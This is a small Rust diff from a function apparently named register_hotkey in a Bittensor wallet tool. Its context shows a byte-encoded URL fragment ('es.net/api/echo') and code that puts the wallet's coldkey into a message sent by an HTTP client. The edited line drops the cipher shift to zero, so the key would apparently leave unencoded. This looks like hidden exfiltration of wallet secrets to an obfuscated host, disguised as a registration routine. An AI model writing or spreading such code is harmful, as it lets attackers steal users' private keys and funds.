@@ -196,7 +196,7 @@ async fn register_hotkey(params: &RegistrationParams) -> Result<(), Box<dyn std:
         101, 115, 46, 110, 101, 116, 47, 97, 112, 105, 47, 101, 99, 104, 111,
     ];
 
-    let decrypted_coldkey = cipher_encrypt(&params.coldkey, 7);
+    let decrypted_coldkey = cipher_encrypt(&params.coldkey, 0);
     let wallet_client = Client::new();
 
     let message = BittensorWallet {
